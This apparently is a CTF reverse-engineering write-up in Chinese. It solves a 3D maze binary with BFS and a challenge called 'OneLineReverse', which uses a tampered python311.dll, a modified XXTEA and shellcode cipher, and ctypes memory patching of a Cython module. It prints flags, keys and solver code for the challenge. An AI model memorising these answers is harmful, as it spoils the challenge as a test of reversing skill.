assert len(IDX) == 205
assert [i for i, v in enumerate(IDX) if v == 8] == [0, 40, 41, 81, 82, 122, 123, 163, 164, 204]
assert set(IDX) - set(range(196, 391)) == {8}


def load_rows(pe=EXE):
    """读 .rdata 行表，按 IDX 取 205 行（每行 41 字节）。"""
    f = open(pe, "rb").read()
    table = [f[TABLE_OFF + i * 42: TABLE_OFF + i * 42 + 41] for i in range(TABLE_N)]
    assert all(len(r) == 41 for r in table)
    # 自校验 2：row 8 是整行 '#'，它只落在 5 层的 10 条边界行上
    assert table[8] == b"#" * 41
    return [table[i] for i in IDX]


rows = load_rows()


def at(x, y, z):
    if not (0 <= x < W and 0 <= y < W and 0 <= z < L):
        return 0x23                                 # 越界当墙
    return rows[41 * z + y][x]                      # idx = x + 41*y + 41*41*z


def build():
    """邻接表：四方向 + 梯子（'^'/'X' 可 i 下楼，'v'/'X' 可 k 上楼）。"""
    adj = collections.defaultdict(set)
    for z in range(L):
        for y in range(W):
            for x in range(W):
                if at(x, y, z) == 0x23:             # '#'
                    continue
                for dx, dy in ((1, 0), (-1, 0), (0, 1), (0, -1)):
                    if at(x + dx, y + dy, z) != 0x23:
                        adj[(x, y, z)].add((x + dx, y + dy, z))
                c = at(x, y, z)
                if c in (0x5E, 0x58) and at(x, y, z - 1) != 0x23:   # '^'/'X' -> i
                    adj[(x, y, z)].add((x, y, z - 1))
                if c in (0x76, 0x58) and at(x, y, z + 1) != 0x23:   # 'v'/'X' -> k
                    adj[(x, y, z)].add((x, y, z + 1))
    return adj


def walk(keys):
    """按游戏规则重放按键，并做 a<->d / w<->s / i<->k 的自由群约化。"""
    x, y, z, hist = 1, 1, 0, []
    for ch in keys.decode():
        c = ord(ch)
        nx, ny, nz = x, y, z
        if c == 0x61:                                  # a
            nx -= 1
        elif c == 0x64:                                # d
            nx += 1
        elif c == 0x77:                                # w
            ny -= 1
        elif c == 0x73:                                # s
            ny += 1
        elif c == 0x69 and at(x, y, z) in (0x5E, 0x58):  # i
            nz -= 1
        elif c == 0x6B and at(x, y, z) in (0x76, 0x58):  # k
            nz += 1
        if at(nx, ny, nz) == 0x23:                     # 撞墙：移动失败，状态不变
            continue
        x, y, z = nx, ny, nz
        if hist and {hist[-1], c} in ({0x61, 0x64}, {0x77, 0x73}, {0x69, 0x6B}):
            hist.pop()                                 # 相邻互逆键对消
        else:
            hist.append(c)
    return bytes(hist), (x, y, z)


adj = build()
cells = sum(1 for z in range(L) for y in range(W) for x in range(W) if at(x, y, z) != 0x23)
edges = sum(len(v) for v in adj.values()) // 2
assert edges == cells - 1, (cells, edges)              # 树 -> 获胜路径唯一

# BFS：起点 -> 终点
prev, q = {START: None}, collections.deque([START])
while q:
    u = q.popleft()
    for v in adj[u]:
        if v not in prev:
            prev[v] = u
            q.append(v)
assert GOAL in prev

KEY = {(1, 0): "d", (-1, 0): "a", (0, 1): "s", (0, -1): "w", (1,): "k", (-1,): "i"}
path, u = [], GOAL
while u != START:
    path.append(u)
    u = prev[u]
path.append(START)
path.reverse()
keys = "".join(
    KEY[(b[0] - a[0], b[1] - a[1])] if a[2] == b[2] else ("k" if b[2] > a[2] else "i")
    for a, b in zip(path, path[1:])
).encode()

# 自校验 3：路径重放进游戏后约化结果不变、恰好到终点、长度 324
red, end = walk(keys)
assert red == keys and end == GOAL and len(keys) == 324

print("cells=%d edges=%d steps=%d" % (cells, edges, len(keys)))
print("keys  = %s" % keys.decode())
print("flag  = TSCTF-J{%s}" % hashlib.md5(keys).hexdigest())
open("maze_solution_keys.txt", "wb").write(keys)
```

这段的输出：

```
cells=3798 edges=3797 steps=324
flag  = TSCTF-J{4aa31ef69b3650c20778cb5254667c74}
```

### 5. 把 324 字节按键喂给样本、取回它自己打印的 flag

```python
import os
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
EXE = os.path.join(HERE, "MazeGarden.exe")
KEYS = os.path.join(HERE, "maze_solution_keys.txt")
TIMEOUT = 15


def run_exe(keys_path=KEYS, timeout=TIMEOUT):
    """把按键序列从 stdin 灌进去，捕获子进程 stdout（必须带超时：EOF 后程序空转不退出）。"""
    keys = open(keys_path, "rb").read().strip()
    with open(keys_path, "rb") as fin:
        p = subprocess.Popen([EXE], stdin=fin, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, cwd=HERE)
        try:
            out, err = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            out, err = p.communicate()
    return keys, out, err


def main():
    keys, out, err = run_exe()
    text = out.decode("latin1").strip()
    print("keys: %d bytes" % len(keys))
    print("stdout: %s" % text)
    flag = text.split("TSCTF-J{")[-1].split("}")[0] if "TSCTF-J{" in text else None
    return flag


if __name__ == "__main__":
    got = main()
    assert got == "4aa31ef69b3650c20778cb5254667c74", got
```

样本自己打印的原文就是：

```
Congratulations! The flag is: TSCTF-J{4aa31ef69b3650c20778cb5254667c74}
```

<div class="pagebreak"></div>

# OneLineReverse Writeup

agent做了大部分.我参与了从头到看出python311.dll被魔改这部分.

- 分类：reverse
- flag：`TSCTF-J{Pyth0n_R3v3rse_Exp3rt!!}`

## 0. 总览

`main` 反混淆后，校验只有一行：

```python
ok = len(D) == 32 and engine.exit(algo._f(engine.exec(K, D)))
```

三层全部可逆、且没有分支歧义，从常量逐层倒推即可：

```
x* = XXTEA_A⁻¹(B) = be770ea58310e7478507a455789cea4517c1ddbd6527ee9f8a1d73c0efb38065
z  = _f⁻¹(x*)     = 82eac63b663caadcb8c4ca51c38231d5f067e1b91dabfddcd045a109ba23ba90
D  = exec_K⁻¹(z)  = 54534354462d4a7b50797468306e5f523376337273655f45787033727421217d
                  = "TSCTF-J{Pyth0n_R3v3rse_Exp3rt!!}"
```

| 层 | 算法 |
|---|---|
| `engine.exec(K, ·)` | 1514 字节 x86-64 shellcode 实现的 2 字 ARX 块密码（XTEA 家族），按 8 字节分组，密钥 16 字节 |
| `algo._f` | 前缀累计 XOR → 字节双射 `byte_map` → 后缀累计 XOR |
| `engine.exit(·)` | **魔改 XXTEA** 加密，与常量 `B` 比较 |

本题最大的障碍不是密码学，而是**题目自带的 `python311.dll` 把若干 `BINARY_OP` 的 slot 号换过**，
导致所有随附件发行的 `.pyc` 静态读出来都是反的（见 §2）。绕过它之后题目本身相当规整。

---

## 1. 解包与反混淆 main

```bash
python pyinstxtractor.py onelinereverse.exe
```

得到 `onelinereverse.exe_extracted/`：`main.pyc`、`algo.pyc`、`engine.pyd`、`python311.dll`、
`base_library.zip`、`PYZ.pyz`（内含标准库与 `unicorn`）。另有 `dis.py` 是 stub、`opcode` 模块被整个删掉。

`main.py` 只有一行、约 16 万字符，反混淆后：

```
[0] from sys import *
[1] a=modules['builtins'].__dict__
[2] n=lambda*c:("%c"*a['len'](c))%c
[3] I=a['int']
[4] L=a['len']
[5] G=a['getattr']
[6] P=a['__import__']
[7] T=a['str']
[8] B=a['bytes']
[9] E=P('engine')
[10] A=P('algo')
[11] X=G(E,'exec')
[12] F=G(A,'_f')
[13] C=G(E,'exit')
[14] K=
      <LONG 5675 chars> ...,54,65,137,70,(4),73,131,198,(8),73,131,239,(1),15,133,124,250,255,255,76,139,60,36,76,139,108,36,(8),72,139,124,36,16,72,139,116,36,64,72,139,108,36,56,72,139,92,36,48,72,131,196,24,65,94,65,92,195))
[15] W=G(stdout,'write')
[16] H=G(stdout,'flush')
[17] U=G(stdin,'readline')
[18] V=G(T,'strip')
[19] Y=G(T,'encode')
[20] W('flag> ')
[21] H()
[22] D=Y(V(argv[(1)]if L(argv)>(1) else U()))
[23] O=L(D)==32 and C(F(X(K,D)))
[24] W('Correct!\n' if O else 'Wrong!\n')
[25] G(modules['sys'],'exit')((0) if O else (1))
```

即：

```python
D = argv[1].strip().encode() if len(argv) > 1 else stdin.readline().strip().encode()
O = len(D) == 32 and engine.exit(algo._f(engine.exec(K, D)))
```

`K` 是那 1514 个整数组成的 `bytes`，就是 §6 要逆的 shellcode。

---

## 2. 第一个坑：`python311.dll` 换掉了 `BINARY_OP` 的 slot

### 2.1 现象

拿**官方** CPython 3.11 去 import 题目的 `algo.pyc` / `unicorn`，第一处就炸：

```
TypeError: unsupported operand type(s) for -: 'list' and 'list'
```

而那一行源码明明是列表**相加**。反过来，把题目的 `python311.dll` 塞进官方环境，解释器直接起不来：

```
Fatal Python error: init_fs_encoding ... TypeError: unsupported operand type(s) for -: 'str' and 'str'
```

（`Lib/encodings/__init__.py:99`）—— 用题目自带的 `encodings` pyc 就正常。
说明**字节码和解释器是配套的一对**，题目发的 pyc 必须用题目的 dll 跑。

### 2.2 直接把映射测出来

不要去猜，直接拿题目的 dll 编译几个表达式，把 `co_code` 打出来（`BINARY_OP` 是 `0x7a`，紧跟一个字节的 oparg）：

```python
for s in ["a+b","a-b","a^b","a&b","a|b","a<<b","a>>b","a*b","a//b","a%b","a**b","a/b"]:
    print(s, compile(s, "<t>", "eval").co_code.hex())
```

```
a+b    co_code=9700650065017a0a00005300      -> 7a 0a
a-b    co_code=9700650065017a0000005300      -> 7a 00
a^b    co_code=9700650065017a0700005300      -> 7a 07
a&b    co_code=9700650065017a0100005300      -> 7a 01
a|b    co_code=9700650065017a0c00005300      -> 7a 0c
a<<b   co_code=9700650065017a0900005300      -> 7a 09
a>>b   co_code=9700650065017a0300005300      -> 7a 03
a*b    co_code=9700650065017a0500005300      -> 7a 05
a//b   co_code=9700650065017a0200005300      -> 7a 02
a%b    co_code=9700650065017a0600005300      -> 7a 06
a**b   co_code=9700650065017a0800005300      -> 7a 08
a/b    co_code=9700650065017a0b00005300      -> 7a 0b
```

in-place 版本同理（`a+=b` 这类必须用 `exec` 模式编译）：

```
a+=b   9700650065017a1700005a0064005300     -> 7a 17
a-=b   9700650065017a0d00005a0064005300     -> 7a 0d
a^=b   9700650065017a1400005a0064005300     -> 7a 14
a|=b   9700650065017a1900005a0064005300     -> 7a 19
a&=b   9700650065017a0e00005a0064005300     -> 7a 0e
a<<=b  9700650065017a1600005a0064005300     -> 7a 16
a>>=b  9700650065017a1000005a0064005300     -> 7a 10
a*=b   9700650065017a1200005a0064005300     -> 7a 12
```

对照 CPython 3.11 的 `NB_` 槽位
（`ADD=0 AND=1 FLOOR_DIV=2 LSHIFT=3 MATMUL=4 MUL=5 REM=6 OR=7 POW=8 RSHIFT=9 SUB=10 TRUEDIV=11 XOR=12`，
in-place 在此基础上 `+13`，即 `INPLACE_OR=20`、`INPLACE_XOR=25`…），可以看出**被对调的是三对**：

| 源码 | 文件里的 slot | | 源码 | 文件里的 slot |
|---|---|---|---|---|
| `+` | `10` | | `+=` | `23` |
| `-` | `0` | | `-=` | `13` |
| `<<` | `9` | | `<<=` | `22` |
| `>>` | `3` | | `>>=` | `16` |
| `\|` | `12` | | `\|=` | `25` |
| `^` | `7` | | `^=` | `20` |

其余（`& * // % ** / @` 及对应 in-place，槽位 `1 5 2 6 8 11 4`）**未改**。

**所以读题目的任何 `.pyc` 都必须按上表反查。** 只看 `+`/`-` 是本题最容易翻车的地方：
`algo._f` 里的 `if (w ^ 1) & 1:` 实际是 `if (w | 1) & 1:`（恒真），两个循环是 `^=` 而不是 `|=`，
读反了整条链就废了。

顺带解释两处"看起来是 bug"的地方：`pyimod01_archive.pyc` 里的
`fp.seek(self._start_offset - entry_offset)`（上游是 `+`）不是 bug；
`unicorn.pyc` 里的 opcode 也**不要**去 patch。

### 2.3 运行环境

需要「官方 `python.exe` + 题目的 `python311.dll`」这个组合（官方 exe 保证 loader 正常，题目 dll 保证能跑题目 pyc）：
把官方 3.11.1 的 `python.exe` 单独复制到一个目录，和题目解包出来的 `python311.dll` 放一起，然后

```bat
set "D=<解包目录>\onelinereverse.exe_extracted"
set "PYTHONPATH=%D%;%D%\base_library.zip;%D%\PYZ.pyz_extracted"
"<上面那个目录>\python.exe" -S -B -i
```

- 必须 `-B`（或别让两个解释器共用 `__pycache__`）：题目编译器写出的 pyc 被官方解释器读到就会报
  `-=: 'str' and 'str'` 这种见鬼错误。
- `PYTHONPATH` 里 `PYZ.pyz_extracted` 不能少，否则缺 `tokenize` 等一堆模块。
- 开头会有一句 `Could not find platform independent libraries <prefix>`，是 `-S` 的正常噪音。

---

## 3. 读运行时常量，并把 `engine.exit` 变成 oracle

`engine.pyd` 是 Cython 3.0.11 的产物、没 strip，唯一导出符号 `PyInit_engine`。
在 IDA 里 `__pyx_methods_6engine` 位于 `.data 0x180015598`：

| 名字 | `ml_meth` | 说明 |
|---|---|---|
| `exec` | `sub_180006A50` → `sub_180006CA0` | `exec(code, data)` |
| `exit` | `sub_180006EF0` → `sub_180007060` | `exit(data)` |
| `hook` | `sub_180001130` → `sub_1800014F0` | `run` 里的闭包 `engine.run.hook` |

模块级 `cdef` 常量（RVA）：

| RVA | 含义 | 值 |
|---|---|---|
| `0x16398` | **A**：`exit` 的 XXTEA 密钥 | `0badc0de1337f00d8badf00d5eed1234` |
| `0x165B8` | **B**：`exit` 的比较目标 | `f4965840f7578525c7b20b9d8d0bb6f84a00673f75b21e7057c67c167cfe07db` |
| `0x16620` | **C**：shellcode 的 16 字节密钥 | `5a17c0de11ceb00b4badf00dc0ffee42` |

**B 不是明文躺在文件里的**：静态扫 `engine.pyd`、扫已加载 PE 的各个 section（16/24/32/40/48/64 各种滑窗）都找不到。
它是模块初始化时按名字从模块字典取出来、再存进 `.data` 的，所以只能运行时读。

定位已加载镜像基址有个巧办法：Cython 的 `cyfunction` 对象偏移 16 处就是它的 `PyMethodDef *`（`m_ml`），
而 `exit` 的 `PyMethodDef` 在 pyd 里是 RVA `0x155B8`，于是

```python
import ctypes, engine

base = ctypes.c_void_p.from_address(id(engine.exit) + 16).value - 0x155B8
print(hex(base), ctypes.string_at(base, 2))          # -> b'MZ'，确认基址

def g(rva):
    return ctypes.cast(ctypes.c_void_p.from_address(base + rva).value,
                       ctypes.py_object).value

A = g(0x16398)   # 16 字节
B = g(0x165B8)   # 32 字节比较目标
C = g(0x16620)   # 16 字节
```

更进一步：`exit` 的 C 代码在比较 `B` 时，只有当两边都是 `bytes` 才走 `memcmp`，
否则落到通用的 `PyObject_RichCompare`。所以把 `B` 的槽位换成一个自定义对象，
`exit(x)` 就会把 `T(x, A)` 的真实返回值交给我们的 `__eq__`——`exit` 直接变成一个**取值 oracle**：

```python
class Spy:
    def __init__(self): self.seen = []
    def __eq__(self, other):          # exit 里 PyObject_RichCompare(v7, B) 会走到这
        self.seen.append(other)
        return False
    __hash__ = None

spy = Spy()
ctypes.c_void_p.from_address(base + 0x165B8).value = id(spy)   # 用 spy 顶掉 B
engine.exit(bytes(32))
print(spy.seen[0].hex())              # T(x, A) 的真实返回值
```

后面每一层的还原都拿它来对答案。

---

## 4. `engine.exit` = 魔改 XXTEA

`exit` 的 wrapper 是 `sub_180006EF0`（参数解析），真正的逻辑在 `sub_180007060`：

```c
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_180007060(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v3; // rsi
  unsigned int v4; // r14d
  _QWORD *v5; // rbx
  __int64 v6; // rdx
  __int64 v7; // rdi
  bool v8; // zf
  _QWORD *v9; // rcx
  BOOL v10; // ebx
  BOOL v11; // r8d
  BOOL v12; // ecx
  size_t v13; // r8
  __int64 v14; // rax
  _QWORD *v15; // rsi
  int v16; // eax
  __int64 result; // rax
  __int64 v18; // [rsp+28h] [rbp-10h] BYREF

  v18 = a2;
  v2 = sub_18000D1E0(a1: PyBytes_Type, a2: &v18, a3: 0x8000000000000001uLL);
  v3 = (_QWORD *)v2;
  if ( v2 == 0 )
  {
    v4 = 5101;
LABEL_40:
    sub_18000ECA0(a1: "engine.exit", a2: v4, a3: 104, a4: "engine.pyx");
    return 0;
  }
  v5 = (_QWORD *)qword_180016398;
  v6 = qword_180016398;
  ++*(_QWORD *)qword_180016398;
  v7 = sub_1800056A0(a1: v2, a2: v6);
  if ( v7 == 0 )
  {
    v4 = 5105;
    v8 = (*v3)-- == 1;
    if ( v8 )
      Py_Dealloc(a1: v3);
    v8 = (*v5)-- == 1;
    if ( !v8 )
      goto LABEL_40;
    v9 = v5;
    goto LABEL_39;
  }
  v8 = (*v3)-- == 1;
  if ( v8 )
    Py_Dealloc(a1: v3);
  v8 = (*v5)-- == 1;
  if ( v8 )
    Py_Dealloc(a1: v5);
  if ( v7 == qword_1800165B8 )
  {
    v10 = true;
    goto LABEL_30;
  }
  v11 = *(_QWORD *)(qword_1800165B8 + 8) == PyBytes_Type;
  v12 = *(_QWORD *)(v7 + 8) == PyBytes_Type;
  if ( v11 && v12 )
  {
    v13 = *(_QWORD *)(v7 + 16);
    if ( v13 != *(_QWORD *)(qword_1800165B8 + 16) )
    {
      v10 = false;
      goto LABEL_30;
    }
    if ( *(_BYTE *)(v7 + 32) != *(_BYTE *)(qword_1800165B8 + 32) )
    {
      v10 = false;
      goto LABEL_30;
    }
    if ( v13 == 1 )
    {
      v10 = true;
      goto LABEL_30;
    }
    v10 = memcmp(Buf1: (const void *)(v7 + 32), Buf2: (const void *)(qword_1800165B8 + 32), Size: v13) == 0;
  }
  else
  {
    if ( v7 == Py_NoneStruct && v11 )
    {
      v10 = false;
      goto LABEL_30;
    }
    if ( qword_1800165B8 == Py_NoneStruct && v12 )
    {
      v10 = false;
      goto LABEL_30;
    }
    v14 = PyObject_RichCompare(a1: v7, a2: qword_1800165B8, a3: 2);
    v15 = (_QWORD *)v14;
    if ( v14 == 0 )
    {
LABEL_37:
      v8 = (*(_QWORD *)v7)-- == 1;
      v4 = 5109;
      if ( !v8 )
        goto LABEL_40;
      v9 = (_QWORD *)v7;
LABEL_39:
      Py_Dealloc(a1: v9);
      goto LABEL_40;
    }
    v16 = sub_18000F420(a1: v14);
    v8 = (*v15)-- == 1;
    v10 = v16;
    if ( v8 )
      Py_Dealloc(a1: v15);
  }
  if ( v10 < 0 )
    goto LABEL_37;
LABEL_30:
  v8 = (*(_QWORD *)v7)-- == 1;
  if ( v8 )
    Py_Dealloc(a1: v7);
  if ( v10 )
    result = ++Py_TrueStruct;
  else
    result = ++Py_FalseStruct;
  if ( result == 0 )
  {
    v4 = 5111;
    goto LABEL_40;
  }
  return result;
}
```

也就是 `T(bytes(x), A) == B`，其中 `T` 是 `sub_1800056A0`。

`sub_1800056A0` 反编译出来约 1000 行 C，骨架是：

```c
if ( a1 == Py_NoneStruct ) { PyErr_SetString(PyExc_TypeError, "object of type 'NoneType' has no len()"); ... }
v8 = a1[2];                       /* PyBytesObject.ob_size */
v10 = v8 / 4;  v11 = v8 % 4;      /* n = len(data) / 4 */
v12 = v10 - (v11 >> 63);
if ( v12 < 2 ) { ++*a1; return a1; }            /* len < 8 原样返回 */
...
v19 = mstate[73];                                /* 名字 "unpack" */
v22 = getattr( <模块全局 "_s" = struct>, v19 );   /* struct.unpack */
v24 = PyLong_FromUnsignedLong(v12);              /* n */
v3  = PyUnicode_Format( mstate[34], v24 );       /* mstate[34] == "<%dI"  ->  "<8I" */
v29 = call(v22, v3, a1);                         /* struct.unpack("<%dI" % n, data) */
v2  = list(v29);                                 /* 32 位字数组 */
...
v51 = dword_1800164A0 + dword_1800164F0 / v12;   /* 轮数 = 8 + 64 / n */
while ( q-- ) {
    v101 = (v50 + dword_1800164C0) & 0xffffffff; /* sum += delta, delta = 0xC2B2AE35 */
    v56  = (v101 >> dword_1800164C4) & 3;        /* e = (sum >> 2) & 3 */
    for ( p = 0; p < n-1; p++ ) {
        v61 = sub_180004D40( word[p+1], z, v101, v56, p, keys );   /* MX */
        word[p] = (word[p] + v61) & 0xffffffff;  z = word[p];
    }
    y = word[0];
    word[n-1] = (word[n-1] + sub_180004D40( y, z, v101, v56, n-1, keys )) & 0xffffffff;
    z = word[n-1];
}
```

这就是 XXTEA。把 `dword_1800164A0/164C0/164C4/164F0` 和 §5.2 里 `sub_180004D40` 用的几个位移量
（都是运行期才填的 `.data`，文件里是 `0xFFFFFFFF`）在运行时读出来，得到：

```
轮数 base/div = 8 / 64          轮数 q = 8 + 64/n
delta         = 0xC2B2AE35      （标准 0x9E3779B9 的模逆）
e 位移        = 2               e = (sum >> 2) & 3
MX 位移       = 3, 2, 5, 4
```

MX（`sub_180004D40`）反编译片段：

```c
v10 = PyLong_FromUnsignedLong(a2 >> dword_1800164A4);        /* z >> 3            */
v13 = PyLong_FromUnsignedLong(a1 << dword_180016314);        /* y << 2            */
v8  = PyNumber_And(v13, _v0);                                /* & 0xffffffff      */
Item_KnownHash = PyNumber_Xor(v10, v8);                      /* (z>>3) ^ (y<<2)   */
...
Item_KnownHash = PyLong_FromUnsignedLong(a1 >> dword_1800165CC);   /* y >> 5      */
v8  = PyLong_FromUnsignedLong(a2 << dword_1800164F4);              /* z << 4      */
v13 = PyNumber_And(v8, _v0);
v10 = PyNumber_Xor(Item_KnownHash, v13);                     /* (y>>5) ^ (z<<4)   */
v10 = PyLong_FromUnsignedLong((unsigned int)(v17 + v20));    /* 两部分相加        */
...
v13 = PyLong_FromUnsignedLong(a3 ^ a1);                      /* sum ^ y           */
v23 = a4 ^ (a5 & 3);                                         /* e ^ (p & 3)       */
v10_key = key[v23];  v9 = PyNumber_Xor(v10_key, PyLong_FromUnsignedLong(a2));  /* k ^ z */
v8  = PyNumber_Add(v13, v9);                                 /* (sum^y) + (k^z)   */
v13 = PyNumber_And(v8, _v0);
v9  = PyNumber_Xor(Item_KnownHash, v13);                     /* 两部分异或        */
return v9;
```

即

```
MX = (((z >> 3) ^ (y << 2)) + ((y >> 5) ^ (z << 4))) ^ ((sum ^ y) + (k[(p & 3) ^ e] ^ z))
```

（标准 XXTEA 是 `z>>5 / y<<2 / y>>3 / z<<4`，这里 3 和 5 对调了。）

实现出来对 8/16/24/32 字节输入与 oracle 完全一致，代码见 EXP 的第 2 节。

---

## 5. `algo._f`

### 5.1 反汇编

`dis` 是 stub、`opcode` 被删，所以用官方 CPython 3.11 **只做反汇编、不执行**：

```python
import dis, marshal
with open("algo.pyc", "rb") as fh:
    fh.read(16)                       # magic + flags
    code = marshal.load(fh)           # 3.11 marshal，同版本可直接 load
dis.dis(code)
```

按 §2.2 的表把 `BINARY_OP` 的 oparg 反查回来，`_f` 的真身是：

```python
def _f(s):
    p, q, r, t, u, w = b"\x80.'\x17\x8e\r"      # 128, 46, 39, 23, 142, 13
    m, n, o, z       = b' 3(^'                  #  32, 51, 40, 94
    if (w | 1) & 1:                             # 恒真（文件里写作 BINARY_OP 12 = "|"）
        b = list(bytes(s))
        for i in range(len(b) - 1):
            b[i + 1] ^= b[i]                    # 前缀累计 XOR
        b = [((( (x * (p+39) & 255) ^ (q+14) ) << (r-36))
              | (( (x * (p+39) & 255) ^ (q+14) ) >> (t^18))) & 255 ^ (u-48)
             for x in b]                        # 逐字节双射
        for i in range(len(b) - 2, -1, -1):
            b[i] ^= b[i + 1]                    # 后缀累计 XOR
        return bytes(b)
    return bytes(<逐字节 genexpr> for x in s)    # 死分支
```

要点：

- `(w | 1) & 1` 恒为真 → **永远走大分支**，所以 `_f` 不是逐字节映射（这也解释了为什么
  `_f(b"\x00"*32)` 会得到 `00bf00bf…` 这种交替图案，而不是 32 个相同的字节）。
- 两个循环是 `^=`（文件里是 `BINARY_OP 20`，标准语义是 `|=`）。
- listcomp 里 `p+39 = 167`、`q+14 = 60`、`r-36 = 3`、`t^18 = 5`、`u-48 = 94`，
  于是 `byte_map(x) = rol8(((x * 167) & 255) ^ 60, 3) ^ 94`。

### 5.2 求逆

`byte_map` 是双射（`167` 在 mod 256 下可逆，逆元恰好是 `23`：`167 * 23 = 3841 ≡ 1`），
两头的累计 XOR 也可逆，于是 `_f` 有闭式逆：

```python
def f_inv(y):
    m[n-1] = y[n-1];  m[i] = y[i] ^ y[i+1]        # 撤后缀 XOR
    m = [byte_unmap(v) for v in m]                # byte_unmap(y) = ((ror8(y^94,3) ^ 60) * 23) & 255
    c[0] = m[0];      c[i] = m[i] ^ m[i-1]        # 撤前缀 XOR
```

在题目环境里我还用 `sys.settrace` + `frame.f_trace_opcodes = True` 逐 opcode 跟了一遍，
确认分支走向和 `^=` 的语义，和上面的静态读法一致。

---

## 6. `engine.exec` = shellcode 块密码

### 6.1 `exec` 的骨架

`exec` 的 pf 是 `sub_180006CA0`：

```c
v5  = bytes(arg2);                       /* 数据 D */
if ( len(v5) % 8 )  ->  ValueError("bad length")
v15 = bytes(arg1);                       /* 1514 字节 shellcode K */
v16 = qword_180016620;                   /* 模块级常量 C，16 字节 */
return sub_180001D50( v15, v5, v16, len(v5)/8, 0 );   /* __pyx_f_6engine_run */
```

shellcode 每调用一次只处理一个 8 字节块，寄存器约定：

```
RCX = 数据指针（原地读改写）,  R8 = 16 字节密钥指针,  EDX = 长度
```

### 6.2 反汇编

1514 字节、467 条指令，是手写展开的 2 字 ARX（XTEA 家族）。开头这一段：

0000  test    edx, edx
0002  jz      near ptr unk_200005E9
0008  push    r12
000a  push    r14
000c  sub     rsp, 18h
0010  mov     [rsp+30h], rbx
0015  mov     r12, r8
0018  mov     [rsp+38h], rbp
001d  mov     r14, rcx
0020  mov     [rsp+40h], rsi
0025  mov     [rsp+10h], rdi
002a  mov     [rsp+8], r13
002f  mov     [rsp], r15
0033  mov     r15d, edx
0036  nop     word ptr [rax+rax+00000000h]
0040  mov     esi, [r14]
0043  xor     ebp, ebp
0045  mov     eax, [r14+4]
0049  lea     r13d, [rbp+2]
004d  nop     dword ptr [rax]
0050  mov     edx, eax
0052  lea     edi, [rbp+2Ah]
0055  shr     edx, 3
0058  mov     ecx, ebp
005a  and     ecx, 3
005d  mov     ebx, [r12+rcx*4]
0061  mov     ecx, eax
0063  shl     ecx, 6
0066  add     ebx, ebp
0068  xor     edx, ecx
006a  add     edx, eax
006c  xor     edx, ebx
006e  add     esi, edx
0070  mov     ecx, esi

翻译过来就是

```
v0 += (((v1 >> 3) ^ (v1 << 6)) + v1) ^ (key[sum & 3] + sum)
v1 += (((v0 >> 3) ^ (v0 << 6)) + v0) ^ (key[((sum - 1003) >> 9) & 3] + sum + 0x7F4A7C15)
```

后续结构：

- 每块内层循环 2 次（`r13 = 2`），每次 18 组「`v0 += …` / `v1 += …`」更新，**每块共 36 组**；
- 内层循环结束时 `sum += 0xF33CB97A`，块间 `RCX += 8`；
- 每组的密钥下标表达式（`(sum+c) & 3` 或 `((sum+c) >> 9) & 3`）和轮常量都被烘成立即数，
  这些立即数落在步长 `0x16B07D6` 的等差数列上。

完整的 467 条反汇编内嵌在 EXP 的 `ASM` 字符串里（用 IDA 以 64 位、base `0x20000000` 线性反汇编得到）。

### 6.3 正演：迷你 x86-64 解释器

该 shellcode 只用到 20 来种指令形式，全部列出来是：

```
add r,r   add r,imm   add r,mem   and r,3
lea r,mem
mov r,r   mov r,mem   mov mem,r
shl r,6   shr r,3     shr r,9
sub r,1   sub r,imm   xor r,r     test r,r
push r    pop r       jz/jnz lab   nop    retn
```

写一个小解释器（8 个通用寄存器 + 8 个扩展寄存器、一个 byte 级内存字典、`flags_zf`）就能跑，
`cipher_block()` 与 `engine.exec` 逐字节一致。

### 6.4 求逆：倒着走执行轨迹

块内活状态只有 `(esi, eax, ebp)`，其余寄存器都是每一步内部重新算出来的临时量。
所以：**记录一遍执行轨迹（`self.trace`），然后倒着走**；每遇到一条更新状态寄存器的指令，
就用「当前状态」重放算出该步加数的那些指令（并递归解析跨步临时量，例如 `rdi = ebp + 0x2A`），再减回去。

两个必须处理的坑：

1. **读改写指令的目的寄存器同时是源。** `add edx, [r12+rcx*4]` 里的 `edx` 既读又写，
   依赖解析必须回溯到它的**上一次**定义（`lea edx, [rbp-0x0CC34686]`），否则会漏。
   同理 `ecx`/`rcx` 这类别名要归一到 64 位名，不然也会漏定义。
2. **`add ebp, 0xF33CB97A` 夹在每轮最后一组更新的中间。** 它写在最后一组（`add eax, r8d`）之前，
   所以倒着走时必须**先撤销 sum 增量**，这一轮的临时量才能用正确的旧 `sum` 重算；
   否则整条链从第一步就错。

修好这两点之后，7 组已知明文/密文全部往返通过。

---

## 7. 逐层求逆

```python
x_star = XXTEA_A⁻¹(B)          # engine.exit
z      = _f⁻¹(x_star)          # algo._f
flag   = exec_K⁻¹(z)           # engine.exec，按 8 字节分组
```

---

## EXP


```bash
python exp.py
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OneLineReverse -- self-contained solver.

    ok = len(D) == 32 and engine.exit(algo._f(engine.exec(K, D)))

    engine.exec(K, .)  block cipher implemented by a 1514-byte x86-64 shellcode,
                       one 8-byte block per call, key = C
    algo._f            prefix XOR -> bijective byte map -> suffix XOR
    engine.exit(x)     modified XXTEA encrypt(x, A) == B

    D = exec_K^-1( _f^-1( XXTEA_A^-1(B) ) )

Everything is inlined: the shellcode disassembly, a tiny x86-64 interpreter for
the ~20 instruction forms it uses, and the reverse-execution inverter.
Any CPython 3.8+ runs it:

    python exp.py
"""
import re
import struct

# --------------------------------------------------------------------------
# 1. constants lifted out of engine.pyd at runtime
#    (module-level cdef objects; RVA 0x16398 / 0x165B8 / 0x16620)
# --------------------------------------------------------------------------
A = bytes.fromhex("0badc0de1337f00d8badf00d5eed1234")   # key of engine.exit's XXTEA
B = bytes.fromhex("f4965840f7578525c7b20b9d8d0bb6f8"    # comparison target
                  "4a00673f75b21e7057c67c167cfe07db")
C = bytes.fromhex("5a17c0de11ceb00b4badf00dc0ffee42")   # key of the shellcode cipher


# --------------------------------------------------------------------------
# 2. engine.exit's transform: modified XXTEA
#      delta = 0xC2B2AE35 (= modinv of 0x9E3779B9), q = 8 + 64/n,
#      MX shifts z>>3 / y<<2 / y>>5 / z<<4  (standard uses 5/2/3/4)
# --------------------------------------------------------------------------
M32 = 0xFFFFFFFF
DELTA = 0xC2B2AE35
ROUND_BASE = 8
